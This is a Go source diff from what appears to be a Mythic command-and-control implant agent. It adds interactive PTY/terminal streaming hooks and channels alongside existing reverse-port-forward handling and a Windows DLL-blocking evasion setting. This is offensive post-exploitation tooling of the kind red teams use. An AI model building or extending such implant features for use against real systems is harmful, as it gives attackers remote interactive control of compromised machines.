@@ -293,6 +293,10 @@ func runAgent() {
 		commands.SetRpfwdManager(rpfwdManager)
 		httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
 		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
+
+		// Wire up interactive hooks for PTY/terminal bidirectional streaming
+		httpProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+		httpProfile.HandleInteractive = commands.RouteInteractiveInput
 	}
 
 	// Configure child process protections (Windows: block non-Microsoft DLLs)
@@ -479,11 +483,13 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 
 	// Create Job struct with channels for this task
 	job := &structs.Job{
-		Stop:              new(int),
-		SendResponses:     make(chan structs.Response, 100),
-		SendFileToMythic:  files.SendToMythicChannel,
-		GetFileFromMythic: files.GetFromMythicChannel,
-		FileTransfers:     make(map[string]chan json.RawMessage),
+		Stop:                         new(int),
+		SendResponses:                make(chan structs.Response, 100),
+		SendFileToMythic:             files.SendToMythicChannel,
+		GetFileFromMythic:            files.GetFromMythicChannel,
+		FileTransfers:                make(map[string]chan json.RawMessage),
+		InteractiveTaskInputChannel:  make(chan structs.InteractiveMsg, 100),
+		InteractiveTaskOutputChannel: make(chan structs.InteractiveMsg, 100),
 	}
 	task.Job = job
 
